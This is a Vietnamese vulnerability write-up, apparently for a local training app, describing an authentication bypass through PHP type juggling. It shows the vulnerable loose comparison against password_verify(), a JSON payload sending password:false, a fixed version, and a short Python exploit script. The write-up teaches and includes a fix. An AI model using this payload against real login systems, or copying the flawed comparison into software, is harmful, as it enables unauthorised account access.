1. Authentication Bypass

URL: `http://127.0.0.1/OhMyCrab/modules/auth/auth_bypass.php`

Ứng dụng tồn tại lỗ hổng Authentication Bypass do sử dụng phép so sánh lỏng (==) giữa giá trị mật khẩu do người dùng cung cấp và giá trị mật khẩu lưu trong cơ sở dữ liệu. Endpoint hỗ trợ nhận dữ liệu từ JSON request body, nhưng không kiểm soát kiểu dữ liệu đầu vào, dẫn đến khả năng xảy ra PHP type juggling. Trong đó các giá trị không phải chuỗi (boolean, array, numeric) có thể bị ép kiểu không mong muốn trong quá trình so sánh. Kết hợp hai yếu tố trên, attacker có thể khai thác logic xác thực để bypass đăng nhập mà không cần biết mật khẩu hợp lệ.

PoC

- Truy cập chức năng đăng nhập của hệ thống.

- Intercept request đăng nhập bằng Burp Suite.

- Thay đổi Content-Type từ:`application/x-www-form-urlencoded` thành `application/json`

- Đồng thời thay đổi payload từ dạng form-data: `username=admin&password=123456` thành JSON payload:

```
{
  "username": "admin",
  "password": false
}
```

- Send request và quan sát response trả về

<img width="1083" height="410" alt="image" src="https://github.com/user-attachments/assets/aef7dc3a-db72-4ef0-a017-55603e4c01a5" />

- Ứng dụng trả về phản hồi đăng nhập thành công dù không nhập mật khẩu hợp lệ.

Phân tích source code

```
        $username = $json_data['username'] ?? ($_POST['username'] ?? '');
        $password = $json_data['password'] ?? ($_POST['password'] ?? '');
        
        $stmt = mysqli_prepare($conn, "SELECT password FROM users WHERE username = ?");
        mysqli_stmt_bind_param($stmt, "s", $username);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);

        $login_success = false;

        if ($user = mysqli_fetch_assoc($result)) {
            $stored_hash = $user['password'];
            $password_string = (string)$password; 
            if (password_verify($password_string, $stored_hash) == $password) {
                $login_success = true;
            }
        }
```

- Ứng dụng nhận dữ liệu đăng nhập từ cả JSON body và form-data mà không kiểm tra kiểu dữ liệu đầu vào. Hàm `password_verify()` trả về giá trị boolean để biểu thị kết quả xác thực mật khẩu, tuy nhiên ứng dụng tiếp tục sử dụng phép so sánh lỏng: `password_verify($password_string, $stored_hash) == $password`. Khi attacker gửi payload:

```
{
  "username": "admin",
  "password": false
}
```

- `$password` có giá trị boolean `false`, `password_verify()` trả về false, biểu thức trở thành: `false == false` -> điều kiện đúng -> attacker đăng nhập thành công dẫn đến lỗi type juggling trong PHP.

Cách khắc phục

```
        $username = $json_data['username'] ?? ($_POST['username'] ?? '');
        $password = $json_data['password'] ?? ($_POST['password'] ?? '');
        $stmt = mysqli_prepare($conn, "SELECT password FROM users WHERE username = ?");
        mysqli_stmt_bind_param($stmt, "s", $username);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);
        $login_success = false;
        if ($user = mysqli_fetch_assoc($result)) {
            $stored_hash = $user['password'];
            if (is_string($password) && password_verify($password, $stored_hash)) {
                $login_success = true;
            }
        }
```

- Sau khi fix, ứng dụng kiểm tra kiểu dữ liệu đầu vào bằng `is_string()` để password chỉ được xử lý dưới dạng chuỗi hợp lệ. Ứng dụng sử dụng trực tiếp hàm `password_verify()` để xác thực mật khẩu thay vì thực hiện phép so sánh `==` với dữ liệu người dùng.

Script khai thác

```
import requests

url = "http://127.0.0.1/OhMyCrab/modules/auth/auth_bypass.php"
headers = {
    "Content-Type": "application/json"
}
payload = {
    "username": "admin",
    "password": False
}
response = requests.post(url, json=payload, headers=headers)
if "Đăng nhập thành công" in response.text:
    print("Authentication Bypass thành công")
else:
    print("Authentication Bypass thất bại")
```

Script sử dụng thư viện requests để gửi HTTP POST request tới chức năng đăng nhập, payload gửi giá trị boolean false cho trường password.
